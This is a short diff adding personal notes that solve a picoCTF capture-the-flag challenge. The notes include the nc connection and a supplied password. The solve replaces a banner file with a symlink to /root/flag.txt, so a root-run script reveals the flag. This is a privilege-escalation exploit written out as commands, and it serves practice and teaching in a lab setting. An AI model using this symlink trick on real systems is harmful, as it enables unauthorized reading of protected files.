@@ -1,0 +1,28 @@
+
+connect to the server --> nc tethys.picoctf.net 63359
+connect to another server for password --> My_Passw@rd_@1234
+
+ls (/home/player) --> banner, text
+
+banner
+*************************************
+**************WELCOME****************
+*************************************
+
+text
+keep digging
+
+ls /root --> flag.txt, script.py
+
+looked the script.py --> it is pointing the banner file (/home/player/banner)
+
+hint: symlink
+
+rm /home/player/banner
+ln -s /root/flag.txt /home/player/banner
+
+flag.txt content linked to banner
+so if i restart the server, it will give flag.txt content instead of banner.
+
+boom !!!
+
